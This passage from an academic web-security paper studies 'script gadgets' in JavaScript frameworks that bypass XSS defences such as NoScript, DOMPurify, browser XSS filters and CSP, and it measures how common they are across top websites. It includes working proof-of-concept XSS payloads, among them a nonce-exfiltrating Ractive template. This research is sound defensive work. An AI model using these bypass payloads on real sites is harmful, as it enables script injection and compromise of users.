  name="javascript:alert(1)"></iframe>                                         v-html in Vue.
                                                                                  Given that mitigations based on response sanitization only block
                                                                               vulnerabilities, but make no attempts at detecting artifacts of ex-
Listing 13: Example of bypassing NoScript with Knockout
                                                                               ploits, this makes them easier to bypass, since gadgets are by defi-
gadget
                                                                               nition "safe" code that becomes unsafe when it interacts with other
                                                                               JavaScript code that is otherwise safe. Aiming to lower the false
   A good example of how to bypass request filtering mitigations               positive rate by using response sanitization has the downside of not
like NoScript with gadgets is presented in Listing 13. In this exam-           being able to detect attacks that exploit features that are normally
ple the expressiveness of the framework is used to split an exploit            safe when the JavaScript library is not used.
such as location.href=name (which is detected as an attack by
NoScript as the global name property can generally be set by an
attacker to arbitrary content), into two components. a=location                <div data-role=popup id='-->
followed by a.href=name. Individually, these expressions are harm-               &lt;script&gt;alert(1)&lt;/script&gt;'>
less, but together they allow the user to redirect the user to a               </div>
JavaScript URL specified in the name attribute. NoScript is not able
to parse the markup to figure out that they are both meant to be
executed together.                                                             Listing 14: Example of bypassing DOMPurify with jQuery
                                                                               Mobile gadget
4.3    Bypassing Response Sanitization
       Mitigations
                                                                                  An example on how to use gadgets to bypass response sani-
Response sanitization mitigations are designed to reduce the num-
                                                                               tization mitigations is presented in listing 14. As far as DOMPu-
ber of false positive results that are potentially generated by re-
                                                                               rify is aware, the HTML it sanitized is completely safe. However,
quest filtering. Instead of blocking potentially malicious requests,
                                                                               jQuery Mobile, upon encountering an element with the attribute
response sanitization mitigations aim to detect whether a suspicious
                                                                               data-role=popup, will automatically try to inject an HTML com-
payload actually gets injected into the response.
                                                                               ment with its id. In the code above, we can escape from that com-
   Response sanitization mitigations usually follow one of two
                                                                               ment and execute our code. Note that the same attack works against
different techniques:
                                                                               Internet Explorer’s XSS filter.
      • Remove or neuter the malicious attack. One possible
         way to tackle the potential injection of code is to neuter
                                                                               4.4    Bypassing Code Filtering Mitigations
         it, or remove it from the HTTP response. In this approach,
         the rest of the response is left as-is, but the suspicious code       Code filtering mitigations are an evolution on top of response sani-
         is removed or made inert.                                             tization. They attempt to leave the potentially malicious markup
      • Block the response completely. Another possible way                    untouched, and instead focus on preventing the execution of mali-
         to react to an injection attempt is to completely block the           cious code. This approach has even lower false positive rate than
         response, and display an error to the user. This approach             sanitization, since the code is filtered out only if it’s actually about
         avoids cases in which an attacker tricks a mitigation tech-           to be executed.
         nique into blocking a legitimate script (e.g. a frame buster).           However, one side-effect of such an approach is that since gad-
                                                                               gets do not directly execute any malicious code, but do so indirectly
   Examples of implementations of XSS mitigations that adopt these
                                                                               through trusted code, it is a lot harder for XSS mitigations based
types of approaches are:
                                                                               on code filtering to detect injections using gadgets.
      • HTML sanitizers. Most HTML sanitizers work by taking                      The approaches taken by XSS mitigations based on code filtering
         a piece of HTML code and cleaning it of any malicious                 are:
         input, and returning otherwise safe HTML. Most HTML
         sanitizers, however, are based on whitelists that try to enu-               • Detect malicious code. To detect whether a specific piece
         merate safe HTML tags and attributes across all browsers.                     of code is malicious, it is checked against the HTTP request.
      • Internet Explorer / Edge XSS filter. The XSS filter in                         If the code to be executed is also present in the request,
         Microsoft Internet Explorer and Edge also sanitizes HTML                      it is blocked as not trustworthy and potentially attacker-
         by replacing parts of HTML attributes and tag names with                      controlled.
         a pound # symbol. Note that while HTML sanitizers use                       • Detect benign code. Benign code passes various policy
         whitelists, XSS filters on the other hand work on a black-                    checks based on code provenance, content, or generation
         listing approach, enumerating dangerous HTML tags and                         method. Code violating the policy requirements is consid-
         attributes known by the browser.                                              ered malicious and its execution is blocked.
   Bypassing HTML sanitizers usually requires a slightly different               Examples of implementations of XSS mitigations that adopt this
approach than bypassing XSS filters. For HTML sanitizers, the                  approach are:
                                                                           8
      • Chrome and Safari’s XSS Auditor. The latest XSS filter             We found that most analyzed JavaScript frameworks contain gad-
        to be implemented in a major browser was Chrome and Sa-            gets capable of creating and inserting script elements with con-
        fari’s XSS Auditor. The XSS Auditor hooks into JavaScript          trolled body or src attribute. Such gadgets can be used to bypass
        runtime in the browser. XSS Auditor uses the ’detect mali-         strict-dynamic CSP. As an example, we present the bypass found
        cious code’ approach - before Auditor permits code exe-            in RequireJS:
        cution, it validates that the code was not included in the
        HTTP request, and blocks it if it was.
                                                                           <script data-main='data:1,alert(1)'></script>
      • Content Security Policy. Content Security Policy [34]
        is the most popular example of code-filtering mitigation.
        Web applications using this mitigation define a policy that        Listing 16: Example of bypassing strict-dynamic with Re-
        specifies which scripts are benign and should be allowed           quireJS gadget
        to execute. Scripts violating the policy are blocked by the
        supporting browser. Existing policies usually adopt one
                                                                               Since the <script> tag has a data-main attribute, a gadget in
        the filtering variants described in Section 4.1.1. A typical
                                                                           RequireJS will generate a new script element, with its source
        policy is either URL whitelist-based or nonce/hash-based. A
                                                                           pointing to data:,alert(1). As RequireJS is already trusted,
        policy may also use strict-dynamic and/or unsafe-eval
                                                                           strict-dynamic propagates this trust to the new element, and
        source expressions. These keywords propagate trust to
                                                                           the code will execute, bypassing the page’s Content Security Policy.
        additional code created by already trusted scripts, making
                                                                               We found strict-dynamic bypasses in 13 out of 16 tested frame-
        CSP easier to adopt on existing websites.
                                                                           works (two of the bypasses relied on co-presence of unsafe-eval).
    Code filtering mitigations hook on code execution and aim to           The prevalence of script gadgets in the tested JavaScript frame-
assure only legitimate code gets executed. Since script gadgets are        works suggests that using the strict-dynamic variant of CSP to
already part of a legitimate code base they are extremely useful in        mitigate XSS vulnerabilities in modern web applications is less
bypassing this mitigation group. In the analysis performed against         effective than previously thought [35].
popular frameworks and libraries in section 4.1, we found that code            Bypassing other CSP variants. Both aforementioned CSP key-
filtering mitigations are the ones most vulnerable to gadgets. We          words relax the restrictions of the policy in order to facilitate its
used element construction gadgets (3.5.2), JavaScript execution sink       adoption. Some websites opt to use a stronger version of CSP, e.g.
gadgets (3.5.4) and gadgets in expression parsers (3.5.5) to bypass        relying solely on nonces, or using a whitelist of script source URLs,
code filtering mitigations. While we found that expression-parser-         with no known bypasses in the list of allowed origins [35]. We found
based gadgets were the most universally applicable, some bypass            that even such variants of Content Security Policy can be bypassed
methods employed were mitigation-variant specific:                         using script gadgets in expression parsers (3.5.5). In some frame-
    Bypassing XSS Auditor. We bypassed XSS Auditor in 13 out               works, expression parsers themselves create a runtime environment
of 16 frameworks, as many gadgets use traditional DOM XSS [16]             that allows the attacker to obtain a window object reference and call
sinks, DOM XSS protection being a known shortcoming of XSS                 arbitrary JavaScript functions. Such vectors do not use eval and do
Auditor [32]. For example, a gadget in the Dojo framework calls an         not create new script elements, so Content Security Policy cannot
eval function, with the value extracted from the data-dojo-props           detect and block them. Listings 11 and 12 present examples for this
attribute. This allowed us to create the following bypass:                 type of bypasses. Such gadgets were found in Aurelia, Vue.js and
                                                                           Polymer 1.x. Additionally, in Ractive we found a gadget capable of
                                                                           exfiltrating the CSP nonce into a newly created script, allowing for
<div                                                                       its execution, despite a strong, only nonce-based policy:
  data-dojo-type="dijit/Declaration"
  data-dojo-props="}-alert(1)-{">
                                                                           <script id='template' type='text/ractive'>
</div>
                                                                           <iframe srcdoc='<script
                                                                             nonce={{@global.document.currentScript.nonce}}>
Listing 15: Example of bypassing XSS Auditor with Dojo gad-                  alert(document.domain)
get                                                                          </{{}}script>'>
                                                                             </iframe>
                                                                           </script>
   Bypassing unsafe-eval CSP. In order to bypass CSP with an
unsafe-eval keyword we either used gadgets in expression parsers
                                                                               Listing 17: Bypass exfiltrating CSP nonce in Ractive
or gadgets calling an eval-like function. Listing 15 demonstrates
a bypass using such gadget. We were able to circumvent policies
using unsafe-eval in 10 out of 16 frameworks.                                 It’s worth noting that the success of CSP mitigation depends on
   Bypassing strict-dynamic CSP. Adding a strict-dynamic                   the used variant. If the policy is configured to use whitelists, hashes,
keyword to the CSP enables already trusted code to programmati-            or nonces alone, then only gadgets in expression parsers (3.5.5) are
cally create new script elements. When such scripts are introduced         useful, as the code passed to JavaScript execution sinks (3.5.4) would
into the DOM, they are implicitly trusted and allowed to execute.          not be trusted. A notable exception is strict-dynamic, which
                                                                       9
propagates trust to <script> tags generated programmatically.                  sensitive functions such as eval, innerHTML, document.write, or
Attackers may bypass such CSP with gadgets generating arbitrary                XMLHttpRequest.open()18 . We used this engine to crawl our data
HTML elements, or importing nodes from foreign DOM documents.                  set and identify all data flows. Each of these flows represents a
Such gadgets are common in templating libraries.                               potentially exploitable gadget chain.
   As we have presented above, the gadgets used to bypass different
                                                                                  Verifying Gadgets. In order to verify whether a found flow is
mitigations vary significantly from mitigation to mitigation. Some
                                                                               exploitable from benign HTML markup, we built a generator that
abuse the expression language in libraries, others inject markup
                                                                               is capable of creating a real-world exploit based on each flow. The
in a text attribute, while others abuse trust propagation in DOM
                                                                               generator is similar to the one presented in [17]. Subsequently, we
element creation. This indicates which type of gadgets to search
                                                                               simulate a reflected XSS vulnerability in the page, into which we
for to bypass different types of mitigations.
                                                                               inject the generated exploit. The goal of the exploit is to indirectly
                                                                               execute a JavaScript function from a source that would not usually
5     PREVALENCE OF SCRIPT GADGETS
                                                                               execute such code (e.g. from a data- attribute). Listing 18 shows
In this section we present the results of an empirical study on the            an exemplary gadget that might exist in a legitimate JavaScript file.
prevalence of script gadgets in real-world applications. We first
present our research questions and methodology, then discuss the
results.                                                                       <!-- source element -->
                                                                               <div id="button" data-text="I am a button"></div>
5.1    Research Statement
                                                                               <script>
As shown above, script gadgets have the potential to undermine
                                                                                 // Script gadget reading from #button element.
the protections provided by XSS mitigations. While we manually
                                                                                 var button = document.getElementById("button");
discovered many of these gadgets in popular libraries, it is important
                                                                                 button.innerHTML = button.getAttribute("data-text");
to understand the prevalence of these code patterns at scale. If
                                                                               </script>
gadgets are rare in real-world code, we can address the problem by
taking special care when building generic libraries. If script gadgets
are wide-spread in real-world applications however, addressing this                              Listing 18: An exemplary gadget
problem might be as hard as fixing XSS itself. Therefore, the goal
of this study is to measure the prevalence of gadgets in real-world               For this sample, the engine detects a data flow originating from
applications.                                                                  button.getAttribute(’data-text’) that ends up in the HTML
   After measuring gadget pervasiveness, we aim to find out more               execution sink innerHTML. Based on the context of the sink (HTML,
about the impact of script gadgets on specific XSS mitigations.                JavaScript, URL), the exploit generator generates an exploit that
Specifically, we would like to focus on the Content Security Policy            triggers JavaScript execution within this context:
and HTML sanitizers as these mitigation techniques seem to be the
most robust and relevant ones.
   A previous study [35] has already demonstrated that the do-                 <svg onload=verify()>
main whitelisting and the ’unsafe-inline’ CSP source expres-
sion harm the protection capabilities of CSP. In this study, we’d like                                  Listing 19: XSS payload
to investigate the ’unsafe-eval’ and ’strict-dynamic’ source
expressions. Specifically, we want to investigate how prevalent
                                                                                  Subsequently, we use the source element to generate the final
script gadgets are that can potentially bypass these expressions.
                                                                               exploit as shown in Listing 20. The actual XSS payload can thereby
   Many sanitizers, by default, allow seemingly benign attributes
                                                                               be disguised via the use of different encoding schemes (depending
such as data-*, id or class. Furthermore, sanitizers usually allow
                                                                               on the injection context).
non-malicious tags such as div or span tags. Hence, we’d like to
understand how many real-world gadget chains can be triggered
from such tags and attributes.                                                 <div id="button"
                                                                                   data-text="&lt;svg onload=verify()&gt;">
5.2    Methodology                                                             </div>
In order to detect gadgets in real-world applications, we built a
toolchain to automatically detect and verify them at scale. Based                                      Listing 20: Final Exploit
on this toolchain, we crawled the Alexa Top 5000 Web sites.
   Detecting Gadgets at Scale. As we did not expect to see many ex-               This lets us build the exploits in a way that our verifier function
pression parsers (see 3.5.5) present in user-land code (assuming that          does not trigger by default. This function is called only if a script
expression parsers are mostly present in JavaScript frameworks),               gadget reads the payload from benign markup and executes it.
we decided to focus on gadgets that end in HTML, JavaScript or URL             Therefore, if the function gets called, we have verified the gadget
execution sinks (see 3.5.4). In order to detect such potential gadgets,        in a false-positive-free way.
we built a browser-based, dynamic taint tracking engine. The engine            18 In total the engine supports 60+ sinks, which we cannot easily list due to space
is capable of reporting data flows from DOM nodes into security                constraints
                                                                          10
   Crawling The Data Set. Our initial seed data set consists of the           <div id="foo"><script>verify()</script></div>
Alexa Top 5000 Web sites. We crawled these pages and also vis-
ited all the http: and https: links from these pages that point
                                                                                                 Listing 21: Invalid Exploit
to the same domain or a subdomain. This approach might bias
the data set, since Web pages with more links on the start pages
will be over-represented in the final data set. The same is true for            Instead, we transform the payload into a form that cannot exe-
subdomains: Some Web sites make excessive use of subdomains,                  cute by default, by using the xmp plaintext tag, for example:
while others are not using them at all. Because of this, we decided
to deduplicate our final results based on the first domain before
                                                                              <xmp id="foo"><script>verify()</script></xmp>
the top level domain (subsequently called "second level domains").
E.g. we merge results from sub.example.co.uk, example.co.uk
and foo.example.co.uk and just regard all of these domains as                                Listing 22: Non-executing Exploit
belonging to example.co.uk. We are aware that this approach has
a significant impact on the final results, but we think that this
provides the most realistic view on the data.                                    While this approach completely removes false positives from
                                                                              our results, it might cause a considerable number of false negatives.
                                                                              For example, often the name of a tag is part of the DOM selector
5.3    Limitations                                                            trigerring the gadget. Hence, by changing the tag name (in the
Our testing and verification approach has the following limitations:          example: from div to xmp), the exploit might not be able to trigger
                                                                              the gadget correctly. Effectively we lowered our verification rate
   Only first level links: We only followed the first-level of links,         and in turn significantly increased the quality of our results.
so our data set does not cover all the pages of a site.
                                                                                  Limitation Summary. All these limitations should be taken into
  No user interaction: Our crawlers do not interact with the page.            account when reading the following sections. Most importantly,
This means that we are only able to find gadgets in code that get             we want to point out that the presented results are lower bounds.
executed at page load by default.                                             If deep crawling, user interaction and a less restrictive verification
                                                                              are applied, the resulting numbers will likely be higher.
  No authentication: Our crawlers do not authenticate to the
pages under test. Consequently, we might have missed results in               5.4    Results
authenticated parts of an application, significantly reducing the             This section is divided into several subsections. After reporting
potential coverage of crawled web applications.                               on general crawling results, we present numbers and statistics
                                                                              about the detected data flows. Then we report on the results of our
   Verification does not focus on mitigation bypasses: In the                 automatic gadget verification, and finally we discuss the results in
study, we do not artificially add, modify or remove any specific              the context of XSS mitigation techniques.
XSS mitigation to crawled websites. We only verify that a data flow
from a non-executing source is capable of executing arbitrary code               5.4.1 Crawling Results. As mentioned above, our initial data set
in a page via a gadget, even in the presence of a given mitigation.           consisted of the Alexa top 5000 Web sites. By following the first-
The reason for this is that some mitigations cannot be easily applied         level links, we crawled 647,085 Web pages on the same domains or
to Web sites. For example, applying a Web Application Firewall or             subdomains of this set, which finally contained 37,232 different sub
Content Security Policy (see 2.3) to a page requires a non-trivial            domains and 4,557 second-level-domains. The number of second-
amount of configuration, and is likely to break the functionality             level domains is lower than 5000, because some entries in the Alexa
when done automatically. Furthermore, exploits need to be adopted             Top Sites file redirect to the same domain based on geo location. For
to the specific mitigation techniques. Hence, by focusing on the              example, google.it, google.de, google.fr all redirect to google.com.
mere code execution aspect, we can verify gadgets more efficiently.           Furthermore, some Web sites were not reachable or timed out while
                                                                              crawling. In some cases, this is due to sites that only use regional
   Our XSS simulation approach is false-negative-prone: In                    CDNs. For example, a site from Asia might be fast in Asia but very
a real-world mitigation setting, the initial XSS attack should be             slow when requested from the US or Europe. For all the remaining
blocked by stopping the execution of the injected code. However,              pages, we collected data flows using our taint engine.
even when the original injection was stopped, a gadget can still po-
tentially execute the injected content, effectively bypassing the mit-           5.4.2 Taint Results. On average we measured 7.67 sink calls per
igation. For example, while script elements are initially blocked             crawled URL and around 450 sink calls aggregated per second-level
by CSP, they remain in the DOM and gadgets may reintroduce                    domain. In total, we counted 4,352,491 sink calls with data result-
them, triggering them again. While this would be a valid mitigation-          ing from 4,889,568 unique sources within the DOM. Grouped by
specific bypass, this payload would execute directly without trig-            second-level domain, sink and source, we measured 22,379 unique
gering any gadget when a CSP is not present. In order to avoid                combinations.
such false-positive findings, we only generate exploits that do not              5.4.3 Mitigation results. In the following, we want to relate
trigger JavaScript execution by default. For example, we did not              these results to the XSS mitigations, especially CSP ’unsafe-eval’,
inject gadgets in the following form:                                         CSP ’strict-dynamic’ and HTML sanitizers.
                                                                         11
   Content Security Policy - ’unsafe-eval’: As opposed to the ’unsafe-                HTML Sanitizers: Sanitizers aim at removing potentially mali-
inline’ keyword, unsafe-eval in the past seemed to be more secure                 cious content. Most sanitizers do this by defining a known-good
in general. While unsafe-inline almost completely removes the                     list of tags and attributes and removing anything else from a pro-
protection capabilities of a CSP policy, unsafe-eval by default                   vided string. This list varies from sanitizer to sanitizer. The Closure
does not make the policy bypass-able. In order to bypass the policy               sanitizer for example, removes data- attributes, while DOMPurify
with unsafe-eval an attacker needs to find an injection into a                    allows them in its default configuration. Furthermore, all sanitizers
JavaScript execution function (eval, new Function, setTimeout,                    we looked at allow id and class attributes. Hence, we investigated
setInterval, etc.). Finding a direct injection is often hard and time             whether this behavior is secure. In our data set 78.30% of all second-
consuming, because the use of such function is limited and can be                 level domains had at least one data flow from an HTML attribute
easily audited by the application owner. Hence ’unsafe-eval’ was                  into a security-sensitive sink, whereas 59.51% of the sites exhibited
seen as an acceptable trade-off between security and usability of                 such flows from data- attributes. Furthermore, 15.67% executed
CSP. However, the results of our study imply that this long-held                  data from id attributes and 10% from class attributes. Based on
belief should be changed. Gadgets can be used as an indirect way                  these numbers, we recommend to revisit at least the sanitization
of reaching an execution sink. If DOM content gets evaluated by                   approach towards blocking data- attributes.
default, the attacker can inject the code as a DOM node in order
to abuse the eval-gadget to execute arbitrary code. In our data                      5.4.4 Gadget Results. Based on the identified data flows, we gen-
set 47.76% of all second-level domains contained a data flow that                 erated 1,762,823 gadget-based exploit candidates, based on which
ended within a JavaScript execution function. During our crawl, for               we validated 285,894 gadgets on 906 (19.88%) of all second-level
example, we unintentionally automatically bypassed Tumblr’s CSP                   domains.
policy with a gadget bypassing its unsafe-eval source expression.
                                                                                  6     SUMMARY & DISCUSSION
   Content Security Policy - ’strict-dynamic’: The strict-dynamic
                                                                                  Our study has demonstrated that data flows from the DOM into
source expression was added to CSP to increase the usability of
                                                                                  security-sensitive functions are very frequent in modern applica-
nonce-based policies. As described in 4.1.1, strict-dynamic en-
                                                                                  tions and frameworks. In fact, 81.85% of all second-level domains
ables automatic trust propagation to child scripts. If a nonced, and
                                                                                  exhibited at least one relevant data flow. Furthermore, we have
thus legitimate, script appends a child script element to the DOM,
                                                                                  shown that we can detect these flows and generate exploits that
the child script would be blocked unless the parent script propa-
                                                                                  are capable of bypassing all modern XSS mitigations. In a fully
gates the nonce to the script as well. As many libraries are not aware
                                                                                  automated fashion, we detected and verified gadgets on 19.88%
of CSP, these libraries do not propagate the nonce and thus CSP
                                                                                  of all second-level domains. However, due to our methodology,
would block the child script and break the library’s functionality.
                                                                                  we believe that this is just a lower bound for the real extent of
When strict-dynamic is enabled trust is automatically propa-
                                                                                  this problem. By applying deeper crawling, authentication, user
gated to non-parser-inserted script elements. Consequently, under
                                                                                  interaction and less conservative testing approach the numbers
strict-dynamic, child script elements are automatically executed
                                                                                  would doubtlessly increase considerably. We specifically removed
even if they do not carry a nonce. In this situation, attackers may
                                                                                  or changed all exploits that would result in an immediate execution
use gadgets to bypass CSP. If DOM content gets injected into a
                                                                                  at the initial injection.
script element, or into a library function (e.g. jQuery.html) that
                                                                                     Given these results, we believe that XSS mitigations in their
creates and appends new script elements, strict-dynamic CSP
                                                                                  current form are not well aligned with modern applications, frame-
can be bypassed. In order to measure potentially affected Web sites,
                                                                                  works and vulnerabilities. In general, we see three different ways
we counted the following data flows:
                                                                                  to address the issue of script gadgets:
      • The data flows ending within text, textContent or
         innerHTML of a script tag
      • The data flow ending within text, textContent or
                                                                                  6.1    Fix the Mitigation Techniques
         innerHTML of a tag, where the tag name is DOM-controlled                 Making mitigation techniques gadget-aware in general is hard. To-
         (tainted)                                                                day there are so many expression languages, frameworks, libraries
      • The data flow ending within script.src                                    and instances of user-land code that it will be very difficult to ad-
      • The data flow ending in a API which is known for creating                 dress all of the different types of gadgets. For example, request
         and appending script tags to the DOM.                                    filtering mitigations (4.2) will have a hard time in detecting all the
                                                                                  various forms that script gadgets can take, especially when the gad-
   In total, 73.03% of all second-level domains contained at least
                                                                                  get chain makes use of string transformation functions. However,
one data flow with the described characteristics. For example, we
                                                                                  we believe that a few of the vectors can be addressed by specific mit-
detected a gadget capable of bypassing strict-dynamic in Face-
                                                                                  igations. HTML sanitizers, for example, could start to filter data-,
book’s fbevents.js library19 .
                                                                                  id or class attributes.
  Content Security Policy - Summary. Given the numbers and
examples provided above, we believe that unsafe-eval and                          6.2    Fix the Applications
strict-dynamic considerably weaken a CSP policy. Great care
                                                                                  Another approach to address the identified problems is to try to
should be taken when using these source expressions.
                                                                                  fix the applications. Popular libraries and frameworks, for example,
19 https://developers.facebook.com/docs/ads-for-websites/pixel-events/v2.9        could aim at removing gadgets in order to safeguard their users.
                                                                             12
Given the extent of the problem however, we will likely not be able           frameworks like AngularJS create insecure injection vulnerabili-
to address this problem at scale.                                             ties which are out-of-scope for classic server-side XSS sanitization
   As some gadgets and gadget chains are part of the feature set of           techniques, due to custom client-side markup conventions [10].
a framework, it is unlikely that developers of such frameworks are            Furthermore, they uncovered how specific, non-standard browser
willing to remove or restrict these features for preventing XSS miti-         behavior potentially transformed initially secure DOM content into
gation bypasses. Furthermore, we found a number of unintentional              executable code, if read and rewritten via JavaScript [12]. Athana-
gadgets; code paths that were triggered through gadgets that were             sopoulos et al. [2] described return-to-JavaScript, a similar attack
not intended by their developers. These unintended code paths are             scenario circumventing mitigations based on script whitelists. In
hard to find, sometimes even harder than a simple XSS vulnerabil-             their attack, the attacker executes already whitelisted scripts in an
ity. As a result, we believe that fixing XSS mitigations and script           unwanted fashion. The basic assumption of their attack is that an
gadgets might be as hard and time consuming as fixing the XSS                 XSS exists in the application and the attacker is only able to execute
problem itself.                                                               already whitelisted scripts. Under these assumptions the attacker
                                                                              could try to repurpose whitelisted scripts. For example, if there is
                                                                              a button with a whitelisted event handler that logs out the user,
6.3    Shift from Mitigation to Isolation and                                 the attacker could reuse the whitelisted event handler and attach
       Prevention techniques                                                  it to an onload event via the XSS vulnerability. In this way users
Due to the results of our study, we believe that the focus of Web             would be logged out immediately once they visit the application.
Security engineers should shift from mitigation techniques towards            While the mitigation prevents general exploitation, the attacker
isolation and prevention techniques. Sandboxed Iframes [13], Su-              could still harm the user experience considerably by abusing the
borigins [36] or Isolated Scripts [22] are promising proposals for            existing scripts.
Isolation techniques. Furthermore, the Web needs to focus on XSS
prevention techniques: The Web platform is inherently insecure.                  Circumventing XSS mitigations: The topic of undermining the
A novice programmer without much security knowledge is hardly                 protective capabilities of XSS mitigations has been explored pre-
able to create a secure Web application. The Web platform should              viously as well. Zalewski [37] outlined potential future direction
let a developer easily create a secure app by providing secure-by-            of mitigation combating in his influential essay "Postcards from
default APIs. Language-based security concepts, for example, could            the post-XSS world", touching many emerging techniques, such as
be added to the Web platform, so that it is impossible to introduce           content infiltration, whitelist abuse, or potential possibilities for
security vulnerabilities without malicious intent.                            Web code reuse attacks.
                                                                                 On the topic of browser-based XSS mitigations, Nava and Lind-
7     RELATED WORK                                                            say [23] and Bates et al. [3] exposed inherent weaknesses in XSS
                                                                              mitigation approaches that rely on regular expression based de-
   Client-side XSS:. While the source of the initial content injec-
                                                                              tection mechanism. These results directly motivated the design
tion can be caused by all classes of XSS, gadget-based attacks are
                                                                              of the XSSAuditor [3]. In turn, Stock et al. [32] demonstrated the
rooted in insecure client-side data flows caused by JavaScript. Thus,
                                                                              weakness of all string-based XSS filters in non-trivial vulnerability
the closest related class of vulnerabilities is client-side XSS, also
                                                                              scenarios, such as partial or double injections.
known as DOM-based XSS. The first public documentation of this
                                                                                 In addition to research on client-side XSS filters, Content Secu-
vulnerability class was done by Amit Klein in 2005 [16]. In 2013
                                                                              rity Policy was subject of several research endeavors. For one, in
Lekies et al. [17] conducted a large scale study that demonstrated
                                                                              concurrent work Weichselbaum et al [35] and Calzavara et al. [4]
the prevalence of this XSS type, showing that approximately 10%
                                                                              examined the quality and effectiveness of currently deployed CSP
of the examined web sites exposed at least one client-side XSS
                                                                              policies with sobering results. In addition, Weichselbaum et al. [35]
problem. To address this problem, Stock et al. [32] proposed a taint
                                                                              demonstrated how whitelist-based policies can be easily evaded
tracking-based protection mechanism to stop insecure data-flows
                                                                              using overly permissive whitelisted script providers. In comple-
within the web browser. While taint tracking could potentially de-
                                                                              mentary work, Chen et al. [6] and Van Acker et al.[1] presented
tect or stop gadget-based attacks, this paper only covers client-side
                                                                              various techniques to evade CSP’s information flow restrictions.
data flows. Most of our exploits, however, have hybrid data flows
                                                                              Furthermore, Pan et al [25] investigated how to automatically gen-
that span across the client and the server. Hence, in its current ver-
                                                                              erate secure CSP policies (without the unsafe-inline or unsafe-eval
sion Stock et al.’s approach cannot stop our attacks. More recently,
                                                                              keywords). While these policies could resist simple gadgets, such
Parameshwaran et al. [26] advanced this defense via server-side
                                                                              strong policies are still vulnerable to expression-based gadgets as
instrumentation of the JavaScript code, thus eliminating the need
                                                                              outlined in section 4.4. Finally, Heiderich et al. [11] demonstrated
of browser modifications. It is unclear to which degree these taint-
                                                                              how injected HTML and CSS code alone is sufficient to conduct a
based techniques can be adapted to address script gadget attacks,
                                                                              wide range of attacks, even when a comprehensive CSP for script
as the initial payload does not come from a untrusted source, and
                                                                              execution prevention is in place.
thus, are not easily distinguishable from the legitimate targets of
the gadget code.
   The potential security problems of insecure JavaScript trans-
forming DOM content was initially documented by Heiderich et al.
in two distinct variations. In the first, they showed how JavaScript
                                                                         13
8     CONCLUSION                                                                                [11] Heiderich, M., Niemietz, M., Schuster, F., Holz, T., and Schwenk, J. Scriptless
                                                                                                     attacks: stealing the pie without touching the sill. In Proceedings of the 2012 ACM
In this paper, we comprehensively explored code-reuse attacks                                        conference on Computer and communications security (2012), ACM, pp. 760–771.
in Web pages using script gadgets. Script gadgets come in many                                  [12] Heiderich, M., Schwenk, J., Frosch, T., Magazinius, J., and Yang, E. Z. mxss
                                                                                                     attacks: Attacking well-secured web-applications by using innerhtml mutations.
variations and, as our empirical study uncovered, are omnipresent                                    In Proceedings of the 2013 ACM SIGSAC conference on Computer & communications
in modern Web code.                                                                                  security (2013), ACM, pp. 777–788.
   As we have demonstrated, the current generation of XSS mitiga-                               [13] Hickson, I. The iframe element, November 2013.
                                                                                                [14] Jim, T., Swamy, N., and Hicks, M. Defeating script injection attacks with browser-
tions is unable to handle XSS attacks that leverage script gadgets                                   enforced embedded policies. In Proceedings of the 16th international conference
to execute their payloads. And, unfortunately, there is no linear                                    on World Wide Web (2007), ACM, pp. 601–610.
upgrade path to adapt the current mitigation approaches to robustly                             [15] Kern, C. Securing the tangled web. Communications of the ACM 57, 9 (2014),
                                                                                                     38–47.
handle the uncovered vulnerability pattern. While specific mitiga-                              [16] Klein, A. Dom based cross site scripting or xss of the third kind. Web Application
tion techniques can be modified to handle selected gadget types,                                     Security Consortium, Articles 4 (2005), 365–372.
                                                                                                [17] Lekies, S., Stock, B., and Johns, M. 25 Million Flows Later - Large-scale
the high variance of script gadget form and functionality, due to                                    Detection of DOM-based XSS. In Proceedings of the 20th ACM Conference on
the vastly growing amount of custom client-side code and the con-                                    Computer and Communication Security (CCS ’13) (2013).
stant flow of new client-side frameworks, prevents a comprehensive                              [18] Louw, M. T., and Venkatakrishnan, V. BluePrint: Robust Prevention of Cross-
                                                                                                     site Scripting Attacks for Existing Browsers. In IEEE Symposium on Security and
adaption to accommodate the problem.                                                                 Privacy (Oakland’09) (May 2009).
   This leads to a conundrum for the future of client-side Web se-                              [19] Maone, G. Noscript, 2009.
curity: The last 15 years of difficulty in addressing XSS have shown                            [20] MSDN. toStaticHTML method. [API], https://msdn.microsoft.com/library/
                                                                                                     Cc848922.
that XSS apparently cannot be thoroughly addressed in practice                                  [21] Nadji, Y., Saxena, P., and Song, D. Document Structure Integrity: A Robust
through secure coding practices alone. And the subject of this paper,                                Basis for Cross-site Scripting Defense. In Network & Distributed System Security
                                                                                                     Symposium (NDSS 2009) (2009).
especially in combination with complementary results [9, 32], sug-                              [22] Nava, E. A. V. Fighting XSS with Isolated Scripts. [online], http://sirdarckcat.
gest that the current approaches in XSS mitigation are insufficient                                  blogspot.de/2017/01/fighting-xss-with-isolated-scripts.html, January 2017.
to compensate the deficits of code-based XSS prevention.                                        [23] Nava, E. V., and Lindsay, D. Our favorite XSS filters/IDS and how to attack
                                                                                                     them. Presentation at the BlackHat US conference, 2009.
   The question then arises: how do we handle XSS on the road                                   [24] Oda, T., Wurster, G., van Oorschot, P. C., and Somayaji, A. Soma: Mutual
ahead? As discussed above, sophisticated isolation techniques could                                  approval for included content in web pages. In Proceedings of the 15th ACM
offer a third way of dealing with the potential consequences of                                      conference on Computer and communications security (2008), ACM, pp. 89–98.
                                                                                                [25] Pan, X., Cao, Y., Liu, S., Zhou, Y., Chen, Y., and Zhou, T. Cspautogen: Black-box
attacker controlled JavaScript. Alternatively, safe code abstrac-                                    enforcement of content security policy upon real-world websites. In Proceedings
tions [15] and secure-by-default browser APIs [20] might also be an                                  of the 2016 ACM SIGSAC Conference on Computer and Communications Security
                                                                                                     (New York, NY, USA, 2016), CCS ’16, ACM, pp. 653–665.
option to overcome today’s inherent problems of ad-hoc, insecure                                [26] Parameshwaran, I., Budianto, E., Shinde, S., Dang, H., Sadhu, A., and Saxena,
Web content generation.                                                                              P. Auto-patching dom-based xss at scale. In Proceedings of the 2015 10th Joint
   However, regardless of which paradigm the next generation of                                      Meeting on Foundations of Software Engineering (New York, NY, USA, 2015), ACM,
                                                                                                     pp. 272–283.
XSS countermeasures will be build upon, it is essential that they                               [27] Roemer, R., Buchanan, E., Shacham, H., and Savage, S. Return-oriented
have to be capable to handle the unexpected client-side execution-                                   programming: Systems, languages, and applications. ACM Trans. Info. & System
and data-flows which may be caused by legitimate script gadgets.                                     Security 15, 1 (Mar. 2012).
